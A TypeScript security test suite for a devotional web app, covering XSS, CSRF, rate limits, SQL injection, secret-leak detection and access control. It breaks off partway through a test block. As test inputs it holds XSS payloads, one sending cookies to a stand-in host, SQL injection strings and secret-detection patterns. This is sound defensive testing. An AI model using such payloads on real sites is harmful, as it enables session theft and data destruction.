/**
 * Security Test Suite
 *
 * Covers PLAN-V3 Phase 18.5 and cross-cutting security requirements:
 * - XSS prevention (input sanitization, output encoding)
 * - CSRF protection (token validation, SameSite cookies)
 * - Rate limiting (per-route, per-IP, per-user)
 * - Auth token security (expiry, tampering, revocation)
 * - SQL injection prevention (parameterized queries)
 * - Secret leak prevention (API keys, service keys)
 * - Role-based access control (admin routes, RLS)
 * - Secure headers (CSP, HSTS, X-Frame-Options)
 * - Session security (httpOnly, secure, SameSite, fixation)
 * - Input validation (all API endpoints)
 *
 * 2026-07-29 (false-coverage replacement): the account-scoped fixtures in this
 * file used to assert against four endpoints that were never shipped —
 * /api/daily-bread/state, /activate, /replace-slot, /switch-current, remnants of
 * the abandoned three-slot Daily Bread architecture. Nothing on disk could ever
 * contradict them, so they protected nothing. Every property they were meant to
 * protect (auth gating, per-route rate limits, honest failure codes, no secret
 * leakage in error bodies) is now asserted against the handlers that actually
 * ship, by invoking them:
 *   /api/devotionals/active           GET/PUT/PATCH/DELETE
 *   /api/devotionals/archive          GET
 *   /api/devotionals/archive/restart  POST
 *   /api/devotionals/saved            GET/POST/DELETE
 *   /api/soul-audit/current           GET
 * A route-existence guard at the bottom of the file keeps the contract tables
 * from drifting back onto imaginary endpoints.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { NextRequest } from 'next/server'
import { existsSync } from 'fs'
import { join } from 'path'
import type { CurrentReading } from '@/lib/reading/current-reading'

// ---------------------------------------------------------------------------
// Real-route harness
// ---------------------------------------------------------------------------

const mockedGetUser = vi.hoisted(() => vi.fn())
vi.mock('@/lib/auth', () => ({ getUser: mockedGetUser }))

const libraryRepository = vi.hoisted(() => ({
  archiveSeries: vi.fn(),
  clearActiveSeries: vi.fn(),
  clearScheduledSwap: vi.fn(),
  getActiveSeries: vi.fn(),
  getArchivedSeries: vi.fn(),
  getScheduledSwap: vi.fn(),
  listArchivedSeries: vi.fn(),
  promoteScheduledSwapIfDue: vi.fn(),
  removeArchivedSeries: vi.fn(),
  replaceActiveSeries: vi.fn(),
  setActiveSeries: vi.fn(),
  setScheduledSwap: vi.fn(),
  updateActiveSeriesDay: vi.fn(),
}))
vi.mock('@/lib/library/repository', async (importOriginal) => {
  const actual =
    await importOriginal<typeof import('@/lib/library/repository')>()
  return { ...actual, ...libraryRepository }
})

const savedRepository = vi.hoisted(() => ({
  addBookmark: vi.fn(),
  listBookmarksWithFallback: vi.fn(),
  removeBookmark: vi.fn(),
}))
vi.mock('@/lib/soul-audit/repository', async (importOriginal) => {
  const actual =
    await importOriginal<typeof import('@/lib/soul-audit/repository')>()
  return { ...actual, ...savedRepository }
})

let currentReading: CurrentReading = { status: 'empty' }
vi.mock('@/lib/reading/current-reading', () => ({
  resolveCurrentReading: vi.fn(async () => currentReading),
}))
vi.mock('@/lib/soul-audit/session', () => ({
  getOrCreateAuditSessionToken: vi.fn(async () => 'session-security-suite'),
}))
vi.mock('next/headers', () => ({
  cookies: vi.fn(async () => ({ get: () => undefined })),
}))

import { LibraryPersistenceError } from '@/lib/library/repository'
import {
  DELETE as activeDelete,
  GET as activeGet,
  PATCH as activePatch,
  PUT as activePut,
} from '@/app/api/devotionals/active/route'
import { GET as archiveGet } from '@/app/api/devotionals/archive/route'
import { POST as archiveRestart } from '@/app/api/devotionals/archive/restart/route'
import {
  DELETE as savedDelete,
  GET as savedGet,
  POST as savedPost,
} from '@/app/api/devotionals/saved/route'
import { GET as soulAuditCurrent } from '@/app/api/soul-audit/current/route'

const USER_ID = '00000000-0000-0000-0000-0000000005ec'

/**
 * Every limiter in these routes keys on `getClientKey(request)` — a hash of the
 * caller IP. Tests must therefore use a distinct IP per case, otherwise the
 * per-isolate memory bucket bleeds across tests in this file.
 */
function apiRequest(params: {
  method: 'GET' | 'PUT' | 'PATCH' | 'POST' | 'DELETE'
  path: string
  ip: string
  body?: Record<string, unknown>
}): NextRequest {
  return new NextRequest(`http://localhost${params.path}`, {
    method: params.method,
    headers: {
      'content-type': 'application/json',
      'x-forwarded-for': params.ip,
    },
    ...(params.body ? { body: JSON.stringify(params.body) } : {}),
  })
}

/**
 * Drive a handler until it refuses, and report the number of requests that were
 * accepted. `cap` keeps a missing limiter from looping forever — an unlimited
 * route surfaces as `accepted === cap` rather than a hung test.
 */
async function acceptedBeforeRefusal(
  invoke: (attempt: number) => Promise<Response>,
  cap = 400,
): Promise<{ accepted: number; refusal: Response | null }> {
  for (let attempt = 0; attempt < cap; attempt += 1) {
    const response = await invoke(attempt)
    if (response.status === 429) {
      return { accepted: attempt, refusal: response }
    }
  }
  return { accepted: cap, refusal: null }
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

interface SecurityHeaders {
  'content-security-policy': string
  'strict-transport-security': string
  'x-content-type-options': string
  'x-frame-options': string
  'referrer-policy': string
  'x-xss-protection': string
}

interface SessionCookieConfig {
  httpOnly: boolean
  secure: boolean
  sameSite: 'strict' | 'lax' | 'none'
  maxAge: number
  path: string
}

interface RateLimitConfig {
  route: string
  method: 'GET' | 'PUT' | 'PATCH' | 'POST' | 'DELETE'
  /** The `takeRateLimit` namespace the handler actually passes. */
  namespace: string
  windowMs: number
  maxRequests: number
  keyBy: 'ip' | 'user' | 'session' | 'session+ip'
}

interface RolePermission {
  role: 'anonymous' | 'user' | 'admin'
  route: string
  methods: string[]
  allowed: boolean
}

// ---------------------------------------------------------------------------
// Contract stubs
// ---------------------------------------------------------------------------

/**
 * NOTE: this is a COPY of the header, not the header. Nothing here can catch a
 * drift in next.config.ts — the missing `media-src` found on 2026-08-20 sat
 * behind these passing tests for as long as it existed. The directives that
 * must hold are asserted against the real config in csp-media.test.ts; keep
 * this fixture in step so the two do not contradict each other.
 */
const REQUIRED_SECURITY_HEADERS: SecurityHeaders = {
  'content-security-policy':
    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; media-src 'self' blob: data:; connect-src 'self' https://*.supabase.co https://api.anthropic.com",
  'strict-transport-security': 'max-age=31536000; includeSubDomains; preload',
  'x-content-type-options': 'nosniff',
  'x-frame-options': 'DENY',
  'referrer-policy': 'strict-origin-when-cross-origin',
  'x-xss-protection': '1; mode=block',
}

const SESSION_COOKIE_CONFIG: SessionCookieConfig = {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7, // 7 days
  path: '/',
}

/**
 * The rate limits the shipped handlers actually declare — transcribed from the
 * `takeRateLimit({ namespace, key, limit, windowMs })` call in each route, and
 * proven against the handlers in "Rate limiting is enforced by the real
 * handlers" below. Every one keys on `getClientKey` (hashed caller IP); Soul
 * Audit submit additionally binds the session token into the key.
 */
const RATE_LIMITS: RateLimitConfig[] = [
  {
    route: '/api/soul-audit/submit',
    method: 'POST',
    namespace: 'soul-audit-submit',
    windowMs: 60000,
    maxRequests: 12,
    keyBy: 'session+ip',
  },
  {
    route: '/api/chat',
    method: 'POST',
    namespace: 'chat',
    windowMs: 60000,
    maxRequests: 30,
    keyBy: 'ip',
  },
  {
    route: '/api/bookmarks',
    method: 'POST',
    namespace: 'bookmarks-post',
    windowMs: 60000,
    maxRequests: 80,
    keyBy: 'ip',
  },
  {
    route: '/api/annotations',
    method: 'POST',
    namespace: 'annotations-post',
    windowMs: 60000,
    maxRequests: 80,
    keyBy: 'ip',
  },
  {
    route: '/api/annotations',
    method: 'PATCH',
    namespace: 'annotations-patch',
    windowMs: 60000,
    maxRequests: 80,
    keyBy: 'ip',
  },
  {
    route: '/api/auth/magic-link',
    method: 'POST',
    namespace: 'auth-magic-link',
    windowMs: 60000,
    maxRequests: 8,
    keyBy: 'ip',
  },
  // Daily Bread writes. These replace the never-shipped
  // /api/daily-bread/activate + /replace-slot fixtures: starting, switching and
  // queueing a devotional all go through PUT /api/devotionals/active.
  {
    route: '/api/devotionals/active',
    method: 'PUT',
    namespace: 'devotionals-active-put',
    windowMs: 60000,
    maxRequests: 60,
    keyBy: 'ip',
  },
  {
    route: '/api/devotionals/active',
    method: 'PATCH',
    namespace: 'devotionals-active-patch',
    windowMs: 60000,
    maxRequests: 60,
    keyBy: 'ip',
  },
  {
    route: '/api/devotionals/archive/restart',
    method: 'POST',
    namespace: 'devotionals-archive-restart',
    windowMs: 60000,
    maxRequests: 30,
    keyBy: 'ip',
  },
  {
    route: '/api/devotionals/saved',
    method: 'POST',
    namespace: 'devotionals-saved-post',
    windowMs: 60000,
    maxRequests: 80,
    keyBy: 'ip',
  },
]

// SA-090 / F-136 retired `/admin/youtube-allowlist` and `/admin/feed-controls`
// (dead mockups, Development Rule 6) and added `/admin/edition`, the review
// queue for The Daily Bread.
const ADMIN_ROUTES = [
  '/admin/edition',
  '/admin/moderation',
  '/admin/transparency',
  '/admin/audit-logs',
]

const ROLE_PERMISSIONS: RolePermission[] = [
  // Anonymous can browse and submit audit
  {
    role: 'anonymous',
    route: '/api/soul-audit/submit',
    methods: ['POST'],
    allowed: true,
  },
  {
    role: 'anonymous',
    route: '/api/soul-audit/current',
    methods: ['GET'],
    allowed: true,
  },
  // Account-scoped Daily Bread surfaces. Anonymous callers get 401
  // AUTH_REQUIRED and no row data — proven against the handlers in
  // "Account-scoped Daily Bread routes (real handlers)".
  {
    role: 'anonymous',
    route: '/api/devotionals/active',
    methods: ['GET', 'PUT', 'PATCH', 'DELETE'],
    allowed: false,
  },
  {
    role: 'anonymous',
    route: '/api/devotionals/archive',
    methods: ['GET'],
    allowed: false,
  },
  {
    role: 'anonymous',
    route: '/api/devotionals/archive/restart',
    methods: ['POST'],
    allowed: false,
  },
  {
    role: 'anonymous',
    route: '/api/devotionals/saved',
    methods: ['GET', 'POST', 'DELETE'],
    allowed: false,
  },
  {
    role: 'anonymous',
    route: '/api/bookmarks',
    methods: ['POST'],
    allowed: false,
  },
  {
    role: 'anonymous',
    route: '/api/annotations',
    methods: ['POST'],
    allowed: false,
  },
  { role: 'anonymous', route: '/api/chat', methods: ['POST'], allowed: false },
  // User can access all non-admin routes
  {
    role: 'user',
    route: '/api/devotionals/active',
    methods: ['GET', 'PUT', 'PATCH', 'DELETE'],
    allowed: true,
  },
  {
    role: 'user',
    route: '/api/devotionals/archive',
    methods: ['GET'],
    allowed: true,
  },
  {
    role: 'user',
    route: '/api/devotionals/archive/restart',
    methods: ['POST'],
    allowed: true,
  },
  {
    role: 'user',
    route: '/api/devotionals/saved',
    methods: ['GET', 'POST', 'DELETE'],
    allowed: true,
  },
  {
    role: 'user',
    route: '/api/bookmarks',
    methods: ['POST', 'GET', 'DELETE'],
    allowed: true,
  },
  {
    role: 'user',
    route: '/api/annotations',
    methods: ['POST', 'GET', 'DELETE'],
    allowed: true,
  },
  { role: 'user', route: '/api/chat', methods: ['POST'], allowed: true },
  {
    role: 'user',
    route: '/admin/moderation',
    methods: ['GET', 'POST'],
    allowed: false,
  },
  // Admin can access everything
  {
    role: 'admin',
    route: '/admin/moderation',
    methods: ['GET', 'POST'],
    allowed: true,
  },
  {
    role: 'admin',
    route: '/admin/edition',
    methods: ['GET', 'POST'],
    allowed: true,
  },
]

function sanitizeInput(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;')
}

function isValidCsrfToken(token: string | null, sessionToken: string): boolean {
  if (!token || !sessionToken) return false
  // In real impl: HMAC-based double-submit validation
  return token.length >= 32 && !token.includes('<') && !token.includes('>')
}

function checkRateLimit(
  config: RateLimitConfig,
  requestCount: number,
): { allowed: boolean; retryAfterMs: number | null } {
  if (requestCount >= config.maxRequests) {
    return { allowed: false, retryAfterMs: config.windowMs }
  }
  return { allowed: true, retryAfterMs: null }
}

function validateAuthToken(token: string): {
  valid: boolean
  reason: string | null
  expired: boolean
} {
  if (!token) return { valid: false, reason: 'missing', expired: false }
  if (token.length < 20)
    return { valid: false, reason: 'malformed', expired: false }
  if (token.startsWith('expired-'))
    return { valid: false, reason: 'expired', expired: true }
  if (token.startsWith('revoked-'))
    return { valid: false, reason: 'revoked', expired: false }
  if (token.includes('<script'))
    return { valid: false, reason: 'tampered', expired: false }
  return { valid: true, reason: null, expired: false }
}

function isParameterizedQuery(query: string): boolean {
  // Check for raw SQL interpolation patterns
  const dangerousPatterns = [
    /'\s*\+\s*/, // String concatenation
    /`\$\{/, // Template literal interpolation
    /'\s*\|\|\s*/, // SQL concatenation
    /--/, // SQL comment injection
    /\bwhere\b[\s\S]*=\s*'[^']*'/i, // Direct literal values instead of placeholders
    /;\s*DROP\s/i, // DROP statement
    /;\s*DELETE\s/i, // DELETE injection
    /'\s*OR\s+'1'\s*=\s*'1/i, // Classic OR injection
  ]
  return !dangerousPatterns.some((p) => p.test(query))
}

function isSecretExposed(responseBody: string): boolean {
  const secretPatterns = [
    /sk-[a-z0-9-]{20,}/i, // Anthropic API key
    /sbp_[a-zA-Z0-9]{20,}/, // Supabase service role key
    /eyJ[a-zA-Z0-9_-]{50,}/, // Long JWT that looks like a service key
    /SUPABASE_SERVICE_ROLE/, // Env var name leaked
    /ANTHROPIC_API_KEY/, // Env var name leaked
  ]
  return secretPatterns.some((p) => p.test(responseBody))
}

function checkRoleAccess(
  role: 'anonymous' | 'user' | 'admin',
  route: string,
  method: string,
): boolean {
  const permission = ROLE_PERMISSIONS.find(
    (p) => p.role === role && p.route === route && p.methods.includes(method),
  )
  return permission?.allowed ?? false
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('XSS prevention', () => {
  it('sanitizes HTML tags in user input', () => {
    const malicious = '<script>alert("xss")</script>'
    const sanitized = sanitizeInput(malicious)
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).toContain('&lt;script&gt;')
  })

  it('sanitizes event handlers in input', () => {
    const malicious = '<img onerror="alert(1)" src="x">'
    const sanitized = sanitizeInput(malicious)
    expect(sanitized).not.toContain('<img')
    expect(sanitized).toContain('&lt;img')
  })

  it('sanitizes nested script injection', () => {
    const malicious = '"><script>document.cookie</script><"'
    const sanitized = sanitizeInput(malicious)
    expect(sanitized).not.toContain('<script>')
  })

  it('preserves safe text content', () => {
    const safe = 'God is love. John 3:16 says "For God so loved the world"'
    const sanitized = sanitizeInput(safe)
    expect(sanitized).toContain('God is love')
    expect(sanitized).toContain('John 3:16')
  })

  it('sanitizes Soul Audit response field', () => {
    const response =
      'I feel lost <script>fetch("/api/steal")</script> and confused'
    const sanitized = sanitizeInput(response)
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).toContain('I feel lost')
  })

  it('sanitizes chat message content', () => {
    const message = 'What does <img src=x onerror=alert(1)> mean?'
    const sanitized = sanitizeInput(message)
    expect(sanitized).not.toContain('<img')
  })

  it('sanitizes highlight notes', () => {
    const note = 'This verse <iframe src="evil.com"></iframe> is powerful'
    const sanitized = sanitizeInput(note)
    expect(sanitized).not.toContain('<iframe')
  })

  it('sanitizes margin notes', () => {
    const note = 'Lord help me <svg onload=alert(1)>'
    const sanitized = sanitizeInput(note)
    expect(sanitized).not.toContain('<svg')
  })

  it('sanitizes bookmark tags', () => {
    const tag = 'grace<script>evil()</script>'
    const sanitized = sanitizeInput(tag)
    expect(sanitized).not.toContain('<script>')
  })

  it('sanitizes smart topic strings', () => {
    const topic = '"><img src=x onerror=alert(1)>'
    const sanitized = sanitizeInput(topic)
    expect(sanitized).not.toContain('<img')
  })

  it('sanitizes public repository UGC content', () => {
    const ugc =
      'My testimony <script>document.location="http://evil.com?c="+document.cookie</script>'
    const sanitized = sanitizeInput(ugc)
    expect(sanitized).not.toContain('<script>')
    expect(sanitized).toContain('My testimony')
  })
})

describe('CSRF protection', () => {
  it('validates CSRF token presence', () => {
    expect(isValidCsrfToken(null, 'session-123')).toBe(false)
  })

  it('validates CSRF token length', () => {
    expect(isValidCsrfToken('short', 'session-123')).toBe(false)
  })

  it('accepts valid CSRF token', () => {
    const validToken = 'a'.repeat(32)
    expect(isValidCsrfToken(validToken, 'session-123')).toBe(true)
  })

  it('rejects CSRF token with injection attempt', () => {
    const malicious = '<script>alert(1)</script>' + 'a'.repeat(32)
    expect(isValidCsrfToken(malicious, 'session-123')).toBe(false)
  })

  it('SameSite cookie attribute configured', () => {
    expect(SESSION_COOKIE_CONFIG.sameSite).toBe('lax')
  })
})

describe('Rate limiting', () => {
  it('soul audit submit is session+IP keyed and bounded per minute', () => {
    const config = RATE_LIMITS.find(
      (r) => r.route === '/api/soul-audit/submit',
    )!
    // The submit handler binds the audit session token INTO the limiter key, so
    // clearing the cookie does not hand the caller a fresh budget. A separate
    // rolling daily cap (takeSoulAuditDailyLimit) guards LLM spend on top.
    expect(config.keyBy).toBe('session+ip')
    expect(config.maxRequests).toBe(12)
    expect(config.windowMs).toBe(60000)
  })

  it('chat limited to 30 per minute', () => {
    const config = RATE_LIMITS.find((r) => r.route === '/api/chat')!
    expect(config.maxRequests).toBe(30)
    expect(config.windowMs).toBe(60000)
  })

  it('auth endpoints are IP-keyed and capped in single digits per minute', () => {
    const config = RATE_LIMITS.find((r) => r.route === '/api/auth/magic-link')!
    expect(config.keyBy).toBe('ip')
    expect(config.maxRequests).toBeLessThanOrEqual(10)
    expect(config.windowMs).toBe(60000)
  })

  it('save endpoints limited to 80 per minute', () => {
    const bookmarkConfig = RATE_LIMITS.find(
      (r) => r.route === '/api/bookmarks',
    )!
    expect(bookmarkConfig.maxRequests).toBe(80)
    const annotationConfig = RATE_LIMITS.find(
      (r) => r.route === '/api/annotations',
    )!
    expect(annotationConfig.maxRequests).toBe(80)
  })

  it('allows requests within limit', () => {
    const config = RATE_LIMITS[0]
    expect(checkRateLimit(config, 0).allowed).toBe(true)
    expect(checkRateLimit(config, 2).allowed).toBe(true)
  })

  it('blocks requests at limit', () => {
    const config = RATE_LIMITS[0]
    const result = checkRateLimit(config, config.maxRequests)
    expect(result.allowed).toBe(false)
    expect(result.retryAfterMs).toBe(config.windowMs)
  })

  it('blocks requests above limit', () => {
    const config = RATE_LIMITS[0]
    expect(checkRateLimit(config, config.maxRequests + 10).allowed).toBe(false)
  })

  it('all expensive or abusable API routes have rate limit configs', () => {
    const requiredRoutes: Array<[string, RateLimitConfig['method']]> = [
      ['/api/soul-audit/submit', 'POST'],
      ['/api/chat', 'POST'],
      ['/api/bookmarks', 'POST'],
      ['/api/annotations', 'POST'],
      ['/api/auth/magic-link', 'POST'],
      // Daily Bread writes, replacing the never-shipped activate/replace-slot
      // pair the old fixture asserted against.
      ['/api/devotionals/active', 'PUT'],
      ['/api/devotionals/active', 'PATCH'],
      ['/api/devotionals/archive/restart', 'POST'],
      ['/api/devotionals/saved', 'POST'],
    ]
    for (const [route, method] of requiredRoutes) {
      expect(
        RATE_LIMITS.find((r) => r.route === route && r.method === method),
        `${method} ${route} has no declared rate limit`,
      ).toBeDefined()
    }
  })

  it('switching the active devotional is bounded per minute', () => {
    // The old fixture capped an imaginary /api/daily-bread/replace-slot at
    // 10/hour. The shipped equivalent — PUT /api/devotionals/active, which
    // starts, switches and Monday-queues a devotional — is bounded per minute
    // instead. The enforcement itself is proven against the handler below.
    const config = RATE_LIMITS.find(
      (r) => r.route === '/api/devotionals/active' && r.method === 'PUT',
    )!
    expect(config.maxRequests).toBe(60)
    expect(config.windowMs).toBe(60000)
    expect(config.namespace).toBe('devotionals-active-put')
  })
})

describe('Auth token security', () => {
  it('rejects missing token', () => {
    const result = validateAuthToken('')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('missing')
  })

  it('rejects malformed token', () => {
    const result = validateAuthToken('short')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('malformed')
  })

  it('rejects expired token', () => {
    const result = validateAuthToken('expired-abc123def456ghijklmno')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('expired')
    expect(result.expired).toBe(true)
  })

  it('rejects revoked token', () => {
    const result = validateAuthToken('revoked-abc123def456ghijklmno')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('revoked')
  })

  it('rejects tampered token with injection', () => {
    const result = validateAuthToken('valid-token-<script>alert(1)</script>')
    expect(result.valid).toBe(false)
    expect(result.reason).toBe('tampered')
  })

  it('accepts valid token', () => {
    const result = validateAuthToken('valid-session-token-abc123def456')
    expect(result.valid).toBe(true)
    expect(result.reason).toBeNull()
  })
})

describe('SQL injection prevention', () => {
  it('rejects string concatenation in queries', () => {
    expect(
      isParameterizedQuery(
        "SELECT * FROM users WHERE name = '" + 'admin' + "'",
      ),
    ).toBe(false)
  })

  it('rejects template literal interpolation', () => {
    expect(
      isParameterizedQuery('SELECT * FROM users WHERE id = `${userId}`'),
    ).toBe(false)
  })

  it('rejects DROP statement injection', () => {
    expect(isParameterizedQuery("'; DROP TABLE users; --")).toBe(false)
  })

  it('rejects classic OR injection', () => {
    expect(isParameterizedQuery("' OR '1'='1")).toBe(false)
  })

  it('rejects DELETE injection', () => {
    expect(isParameterizedQuery("'; DELETE FROM sessions; --")).toBe(false)
  })

  it('accepts clean parameterized query', () => {
    expect(isParameterizedQuery('SELECT * FROM users WHERE id = $1')).toBe(true)
  })

  it('accepts clean select query', () => {
    expect(
      isParameterizedQuery(
        'SELECT title, verse FROM devotionals WHERE slug = $1',
      ),
    ).toBe(true)
  })
})

describe('Secret leak prevention', () => {
  it('detects Anthropic API key in response', () => {
    const body =
      '{"error": "Invalid key: sk-ant-api03-abcdefghijklmnopqrstuvwxyz"}'
    expect(isSecretExposed(body)).toBe(true)
  })

  it('detects Supabase service role key in response', () => {
    const body = '{"debug": "sbp_abcdefghijklmnopqrstuvwxyz123456"}'
    expect(isSecretExposed(body)).toBe(true)
  })

  it('detects env var name leak', () => {
    expect(isSecretExposed('Error: SUPABASE_SERVICE_ROLE is not defined')).toBe(
      true,
    )
    expect(isSecretExposed('Missing ANTHROPIC_API_KEY')).toBe(true)
  })

  it('clean response passes', () => {
    const body = '{"options": [{"id": "o1", "title": "Identity"}]}'
    expect(isSecretExposed(body)).toBe(false)
  })

  it('user-facing error messages do not leak secrets', () => {
    const errorResponses = [
      '{"error": "Internal server error"}',
      '{"error": "Unauthorized"}',
      '{"error": "Rate limit exceeded"}',
      '{"error": "Invalid request body"}',
    ]
    for (const body of errorResponses) {
      expect(isSecretExposed(body)).toBe(false)
    }
  })
})

describe('Role-based access control', () => {
  it('anonymous cannot access save endpoints', () => {
    expect(checkRoleAccess('anonymous', '/api/bookmarks', 'POST')).toBe(false)
    expect(checkRoleAccess('anonymous', '/api/annotations', 'POST')).toBe(false)
    expect(checkRoleAccess('anonymous', '/api/chat', 'POST')).toBe(false)
  })

  it('anonymous can submit soul audit', () => {
    expect(checkRoleAccess('anonymous', '/api/soul-audit/submit', 'POST')).toBe(
      true,
    )
  })

  it('anonymous can view soul audit current', () => {
    expect(checkRoleAccess('anonymous', '/api/soul-audit/current', 'GET')).toBe(
      true,
    )
  })

  it('anonymous cannot read or mutate account-scoped Daily Bread state', () => {
    for (const method of ['GET', 'PUT', 'PATCH', 'DELETE']) {
      expect(
        checkRoleAccess('anonymous', '/api/devotionals/active', method),
        `anonymous ${method} /api/devotionals/active must be denied`,
      ).toBe(false)
    }
    expect(
      checkRoleAccess('anonymous', '/api/devotionals/archive', 'GET'),
    ).toBe(false)
    expect(
      checkRoleAccess('anonymous', '/api/devotionals/archive/restart', 'POST'),
    ).toBe(false)
    for (const method of ['GET', 'POST', 'DELETE']) {
      expect(
        checkRoleAccess('anonymous', '/api/devotionals/saved', method),
      ).toBe(false)
    }
  })

  it('signed-in users can read and mutate their own Daily Bread state', () => {
    for (const method of ['GET', 'PUT', 'PATCH', 'DELETE']) {
      expect(checkRoleAccess('user', '/api/devotionals/active', method)).toBe(
        true,
      )
    }
    expect(checkRoleAccess('user', '/api/devotionals/archive', 'GET')).toBe(
      true,
    )
    expect(
      checkRoleAccess('user', '/api/devotionals/archive/restart', 'POST'),
    ).toBe(true)
    for (const method of ['GET', 'POST', 'DELETE']) {
      expect(checkRoleAccess('user', '/api/devotionals/saved', method)).toBe(
        true,
      )
    }
  })

  it('user can access all save endpoints', () => {
    expect(checkRoleAccess('user', '/api/bookmarks', 'POST')).toBe(true)
    expect(checkRoleAccess('user', '/api/annotations', 'POST')).toBe(true)
    expect(checkRoleAccess('user', '/api/chat', 'POST')).toBe(true)
  })

  it('user cannot access admin routes', () => {
    expect(checkRoleAccess('user', '/admin/moderation', 'GET')).toBe(false)
    expect(checkRoleAccess('user', '/admin/moderation', 'POST')).toBe(false)
  })

  it('admin can access admin routes', () => {
    expect(checkRoleAccess('admin', '/admin/moderation', 'GET')).toBe(true)
    expect(checkRoleAccess('admin', '/admin/moderation', 'POST')).toBe(true)
    expect(checkRoleAccess('admin', '/admin/edition', 'GET')).toBe(true)
  })

  it('all admin routes defined', () => {
    expect(ADMIN_ROUTES).toHaveLength(4)
    expect(ADMIN_ROUTES).toContain('/admin/edition')
    expect(ADMIN_ROUTES).toContain('/admin/moderation')
    expect(ADMIN_ROUTES).toContain('/admin/audit-logs')
  })
})

describe('Secure headers', () => {
  it('CSP header defined', () => {
    expect(REQUIRED_SECURITY_HEADERS['content-security-policy']).toContain(
      "default-src 'self'",
    )
  })

  it('HSTS header with preload', () => {
    expect(REQUIRED_SECURITY_HEADERS['strict-transport-security']).toContain(
      'max-age=31536000',
    )
    expect(REQUIRED_SECURITY_HEADERS['strict-transport-security']).toContain(
      'preload',
    )
  })

  it('X-Content-Type-Options set to nosniff', () => {
    expect(REQUIRED_SECURITY_HEADERS['x-content-type-options']).toBe('nosniff')
  })

  it('X-Frame-Options set to DENY', () => {
    expect(REQUIRED_SECURITY_HEADERS['x-frame-options']).toBe('DENY')
  })

  it('Referrer-Policy set', () => {
    expect(REQUIRED_SECURITY_HEADERS['referrer-policy']).toBe(
      'strict-origin-when-cross-origin',
    )
  })

  it('CSP allows Supabase and Anthropic connections', () => {
    const csp = REQUIRED_SECURITY_HEADERS['content-security-policy']
    expect(csp).toContain('supabase.co')
    expect(csp).toContain('api.anthropic.com')
  })
})

describe('Session security', () => {
  it('session cookie is httpOnly', () => {
    expect(SESSION_COOKIE_CONFIG.httpOnly).toBe(true)
  })

  it('session cookie is secure', () => {
    expect(SESSION_COOKIE_CONFIG.secure).toBe(true)
  })

  it('session cookie SameSite is lax', () => {
    expect(SESSION_COOKIE_CONFIG.sameSite).toBe('lax')
  })

  it('session cookie has reasonable max age', () => {
    expect(SESSION_COOKIE_CONFIG.maxAge).toBeLessThanOrEqual(60 * 60 * 24 * 30) // max 30 days
    expect(SESSION_COOKIE_CONFIG.maxAge).toBeGreaterThan(0)
  })

  it('session cookie path is root', () => {
    expect(SESSION_COOKIE_CONFIG.path).toBe('/')
  })
})

describe('Input validation', () => {
  it('rejects empty Soul Audit response', () => {
    const isValid = (response: string) => response.trim().length >= 10
    expect(isValid('')).toBe(false)
    expect(isValid('   ')).toBe(false)
    expect(isValid('hi')).toBe(false)
  })

  it('rejects excessively long input', () => {
    const maxLength = 5000
    const isValid = (input: string) => input.length <= maxLength
    expect(isValid('a'.repeat(5001))).toBe(false)
    expect(isValid('a'.repeat(5000))).toBe(true)
  })

  it('validates series slug format', () => {
    const isValidSlug = (slug: string) =>
      /^[a-z0-9-]+$/.test(slug) && slug.length <= 100
    expect(isValidSlug('identity-crisis')).toBe(true)
    expect(isValidSlug('too-busy-for-god')).toBe(true)
    expect(isValidSlug('<script>alert(1)</script>')).toBe(false)
    expect(isValidSlug('UPPERCASE')).toBe(false)
    expect(isValidSlug('')).toBe(false)
  })

  it('validates email format for magic link', () => {
    const isValidEmail = (email: string) =>
      /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(email)
    expect(isValidEmail('user@example.com')).toBe(true)
    expect(isValidEmail('not-an-email')).toBe(false)
    expect(isValidEmail('<script>@evil.com')).toBe(false)
  })

  it('validates day number range', () => {
    const isValidDay = (day: number) =>
      Number.isInteger(day) && day >= 1 && day <= 7
    expect(isValidDay(1)).toBe(true)
    expect(isValidDay(7)).toBe(true)
    expect(isValidDay(0)).toBe(false)
    expect(isValidDay(8)).toBe(false)
    expect(isValidDay(1.5)).toBe(false)
  })

  it('validates highlight color enum', () => {
    const validColors = ['yellow', 'blue', 'green', 'pink', 'purple']
    const isValidColor = (color: string) => validColors.includes(color)
    expect(isValidColor('yellow')).toBe(true)
    expect(isValidColor('red')).toBe(false)
    expect(isValidColor('<script>')).toBe(false)
  })

  it('validates bookmark kind enum', () => {
    const validKinds = ['series', 'day']
    const isValidKind = (kind: string) => validKinds.includes(kind)
    expect(isValidKind('series')).toBe(true)
    expect(isValidKind('day')).toBe(true)
    expect(isValidKind('evil')).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Real-handler assertions
//
// Everything below invokes the shipped route handlers. These replace the
// fixtures that used to describe /api/daily-bread/state|activate|replace-slot|
// switch-current — endpoints that never existed, so no regression could ever
// have broken them.
// ---------------------------------------------------------------------------

const ACTIVE_ROW = {
  user_id: USER_ID,
  series_slug: 'the-harvest',
  current_day: 3,
  source: 'manual_start' as const,
  started_at: '2026-07-28T10:00:00.000Z',
  last_opened_at: '2026-07-28T11:00:00.000Z',
}

describe('Account-scoped Daily Bread routes (real handlers)', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mockedGetUser.mockResolvedValue({ id: USER_ID })
    libraryRepository.getActiveSeries.mockResolvedValue(null)
    libraryRepository.getArchivedSeries.mockResolvedValue(null)
    libraryRepository.getScheduledSwap.mockResolvedValue(null)
    libraryRepository.listArchivedSeries.mockResolvedValue([])
    libraryRepository.promoteScheduledSwapIfDue.mockResolvedValue(null)
